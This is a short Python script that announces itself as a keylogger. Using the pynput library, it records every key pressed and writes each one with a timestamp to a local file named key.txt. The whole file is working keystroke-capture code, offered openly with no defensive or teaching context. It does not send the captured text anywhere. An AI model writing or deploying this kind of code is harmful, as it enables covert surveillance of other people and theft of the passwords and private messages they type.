#! /usr/bin/python3

from pynput.keyboard import Key,Listener
import logging
import time

print("Welcome KeyLogger !!")

format = "%(asctime)s: %(message)s"

logging.basicConfig(filename="key.txt", level=logging.DEBUG, format=format)

def on_press(key):
    logging.debug(key)


with Listener(on_press=on_press) as l:
    l.join()